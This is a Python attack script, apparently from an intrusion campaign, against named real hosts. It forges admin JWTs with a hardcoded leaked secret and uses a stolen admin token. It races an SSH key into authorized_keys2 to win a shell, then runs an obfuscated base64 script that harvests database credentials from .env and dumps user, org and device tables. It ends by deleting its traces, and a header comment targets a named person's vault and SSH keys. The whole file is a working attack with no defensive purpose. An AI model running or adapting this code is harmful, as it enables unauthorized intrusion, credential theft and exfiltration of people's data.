#!/usr/bin/env python3
# i29420 round A: robust shell on 122.51.1.87 (retry loop vs authorized_keys2 race),
# then run atk_mac.py (macOS camping campaign -> Brian's Brians-MBP-2 vault/.ssh/.env).
import os, sys, json, time, base64, hmac, hashlib, subprocess
import urllib.parse as up
import signal
signal.signal(signal.SIGALRM, lambda *a: (print('ALARM_EXIT',flush=True), __import__('os')._exit(0)))
signal.alarm(300)

HOST = "dashboard.lumiiai.cn"
ASSIST = "assistant.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
JWT_SECRET = "w2I+OOqT9vkI12T3bNGwNp/2EA/L2H1ecwnWwA7UZ6A="
ADMIN_TOKEN = "6c73b13da5b9d09c642a3daa85be7d62d8025acfaebfdbe6"
AID = "agent-b8d7ca0b"
OWNER = "af0a2285-490f-11f1-ac43-525400595be1"
TARGET = "122.51.1.87"
RESTORE_DEFAULT = {"ip": "52.53.251.49", "sshUser": "root"}
KEY = "/tmp/ak29420a"

def _b(s):
    if not isinstance(s, str):
        s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()

def R(k, v):
    print("R:%s:%s" % (k, _b(v)), flush=True)

def Rchunk(prefix, v, size=45000):
    s = _b(v)
    for i in range(0, len(s), size):
        print("R:%s__%03d:%s" % (prefix, i // size, s[i:i+size]), flush=True)

def run(args, timeout=60):
    try:
        p = subprocess.run(args, capture_output=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()

def call(path, method="GET", body=None, session=None, admin=False, timeout=30, maxlen=60000, host=HOST):
    url = "https://%s%s" % (host, path)
    args = ["curl", "-s", "-k", "-m", str(timeout), "--http2", "-A", UA,
            "-H", "Accept: application/json, text/plain, */*",
            "-w", "\n__CODE__%{http_code}"]
    if session: args += ["-H", "Cookie: session=" + session]
    if admin: args += ["-H", "Authorization: Bearer " + ADMIN_TOKEN]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", json.dumps(body)]
    elif method != "GET":
        args += ["-X", method]
    args += [url]
    rc, out, err = run(args, timeout=timeout + 20)
    txt = out.decode("utf-8", "replace"); code = ""; i = txt.rfind("__CODE__")
    if i >= 0:
        code = txt[i + 8:].strip()[:3]; txt = txt[:i]
    return {"code": code, "body": txt[:maxlen], "err": err.decode("utf-8","replace")[:300]}

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def forge_dash(user_id, customer="aro", role="admin"):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")))
    p = b64u(json.dumps({"userId": user_id, "email": "p@x", "customer": customer,
                         "role": role, "iat": now, "exp": now + 86400 * 7}, separators=(",", ":")))
    sig = b64u(hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + sig

def jl(s):
    try: return json.loads(s)
    except Exception: return None

def qp(p): return up.quote(p, safe="/")

def ssh(cmd, timeout=120):
    args = ["ssh", "-i", KEY,
            "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
            "-o", "BatchMode=yes", "-o", "IdentitiesOnly=yes",
            "-o", "ConnectTimeout=10", "-o", "LogLevel=ERROR",
            "ubuntu@" + TARGET, cmd]
    return run(args, timeout=timeout + 30)

def upload_key(sess, pub):
    open("/tmp/ak29420a.pub", "w").write(pub + "\n")
    url = "https://%s/api/agents/%s/files/upload?path=%s" % (HOST, AID, qp("/home/ubuntu/.ssh"))
    args = ["curl", "-s", "-k", "-m", "45", "--http2", "-A", UA, "-H", "Cookie: session=" + sess,
            "-F", "files=@/tmp/ak29420a.pub;filename=authorized_keys2;type=text/plain",
            "-w", "\n__CODE__%{http_code}", url]
    rc, out, err = run(args, timeout=60)
    txt = out.decode("utf-8", "replace"); i = txt.rfind("__CODE__"); code = txt[i+8:].strip()[:3] if i>=0 else ""
    return code, txt[:300]

# ---------- P0 health ----------
R("P0_health", call("/api/health", timeout=20))
r = call("/api/admin/agents", admin=True, timeout=40, maxlen=400000)
j = jl(r["body"]) or {}
agents = j.get("agents", []) if isinstance(j, dict) else []
orig = {}
for a in agents:
    if a.get("id") == AID:
        orig = {"ip": a.get("ip"), "sshUser": a.get("sshUser")}
R("P1_admin", {"code": r["code"], "n": len(agents), "target": orig})

sess = forge_dash(OWNER)
run(["ssh-keygen", "-t", "ed25519", "-N", "", "-f", KEY, "-q"], timeout=30)
pub = open(KEY + ".pub").read().strip()

ok = False
tries = []
for attempt in range(9):
    pr = call("/api/admin/agents", method="PATCH", admin=True,
              body={"id": AID, "host": "127.0.0.1", "ssh_user": "ubuntu"}, timeout=20, maxlen=2000)
    code, ub = upload_key(sess, pub)
    rc, out, err = ssh("id; hostname", timeout=30)
    so = out.decode("utf-8","replace")
    tries.append({"a": attempt, "patch": pr["code"], "up": code, "rc": rc, "ssh": so[:40],
                  "err": err.decode("utf-8","replace")[-60:]})
    if b"uid=" in out:
        ok = True; break
    time.sleep(1)
R("P4_shell", {"ok": ok, "tries": tries})

# restore (avoid leaving agent pointing at loopback)
restore = orig if (orig.get("ip") and orig["ip"] not in ("127.0.0.1", "localhost", "LOCAL_HOST")) else RESTORE_DEFAULT
rr = call("/api/admin/agents", method="PATCH", admin=True,
          body={"id": AID, "host": restore["ip"], "ssh_user": restore.get("sshUser") or "root"}, timeout=20, maxlen=2000)
R("P5_restore", {"code": rr["code"], "ip": (jl(rr["body"]) or {}).get("ip")})

if not ok:
    R("P6_result", "NO_SHELL")
    print("NO SHELL", flush=True); sys.exit(0)

# ---------- RECON3 on remote ----------
B64 = "IyEvYmluL3NoCnJ1bl9wc3FsKCkgeyB0aW1lb3V0IDIwIHN1ZG8gLW4gLXUgcG9zdGdyZXMgcHNxbCAtZCBsdW1paV9jZW50ZXIgLVggLUEgLUYnfCcgLWMgIiQxIiAyPiYxOyB9CmVjaG8gIkJFR0lOIgplY2hvICI9PT1FTlZEQj09PSIKc3VkbyAtbiBncmVwIC1haUUgJ0RBVEFCQVNFfFBPU1RHUkVTfF5EQl98UEcnIC9hcHAvLmVudiAyPi9kZXYvbnVsbCB8IGhlYWQgLTIwCmVjaG8gIj09PVRBQkxFUz09PSIKcnVuX3BzcWwgInNlbGVjdCB0YWJsZV9zY2hlbWF8fCcuJ3x8dGFibGVfbmFtZSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS50YWJsZXMgd2hlcmUgdGFibGVfc2NoZW1hIG5vdCBpbiAoJ3BnX2NhdGFsb2cnLCdpbmZvcm1hdGlvbl9zY2hlbWEnKSBvcmRlciBieSAxIiB8IGhlYWQgLTQwMAplY2hvICI9PT1ERVZDT0xTPT09IgpydW5fcHNxbCAic2VsZWN0IHRhYmxlX3NjaGVtYXx8Jy4nfHx0YWJsZV9uYW1lfHwnLid8fGNvbHVtbl9uYW1lIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfc2NoZW1hIG5vdCBpbiAoJ3BnX2NhdGFsb2cnLCdpbmZvcm1hdGlvbl9zY2hlbWEnKSBhbmQgY29sdW1uX25hbWUgfiogJ2RldmljZXxkZXNrdG9wfG9ubGluZXxsYXN0X3NlZW58aG9zdG5hbWV8cGxhdGZvcm0nIG9yZGVyIGJ5IDEiIHwgaGVhZCAtNDAwCmVjaG8gIj09PURVTVBTPT09IgpUQkw9JChydW5fcHNxbCAic2VsZWN0IHRhYmxlX3NjaGVtYXx8Jy4nfHx0YWJsZV9uYW1lIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWEgbm90IGluICgncGdfY2F0YWxvZycsJ2luZm9ybWF0aW9uX3NjaGVtYScpIGFuZCB0YWJsZV9uYW1lIH4qICdkZXZpY2V8ZGVza3RvcCciKQpmb3IgdCBpbiAkVEJMOyBkbyBlY2hvICItLS0gJHQgLS0tIjsgcnVuX3BzcWwgInNlbGVjdCAqIGZyb20gJHQgbGltaXQgMjAwIiB8IGhlYWQgLTIwMDsgZG9uZQplY2hvICI9PT1VU0VSUz09PSIKVVQ9JChydW5fcHNxbCAic2VsZWN0IHRhYmxlX3NjaGVtYXx8Jy4nfHx0YWJsZV9uYW1lIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWEgbm90IGluICgncGdfY2F0YWxvZycsJ2luZm9ybWF0aW9uX3NjaGVtYScpIGFuZCB0YWJsZV9uYW1lIH4qICdeKHVzZXJzfHVzZXJ8b3Jnc3xvcmdhbml6YXRpb25zfG9yZ19tZW1iZXJzfG1lbWJlcnN8YWNjb3VudHMpJCciKQpmb3IgdCBpbiAkVVQ7IGRvIGVjaG8gIi0tLSAkdCAtLS0iOyBydW5fcHNxbCAic2VsZWN0ICogZnJvbSAkdCBsaW1pdCA2MCIgfCBoZWFkIC02MDsgZG9uZQplY2hvICI9PT1ET05FPT09Igo="
rc, out, err = ssh("echo '" + B64 + "' | base64 -d > /tmp/r3.sh && sh /tmp/r3.sh 2>&1; echo RC=$?", timeout=120)
Rchunk("R3out", {"rc": rc, "out": out.decode("utf-8","replace"), "err": err.decode("utf-8","replace")[-800:]})
rc, out, err = ssh("unlink /home/ubuntu/.ssh/authorized_keys2 2>/dev/null; unlink /tmp/r3.sh; echo CLEANED", timeout=25)
R("R39_cleanup", {"rc": rc, "out": out.decode("utf-8","replace")[:200]})
R("R399_done", "recon3 complete")
print("DONE", flush=True)
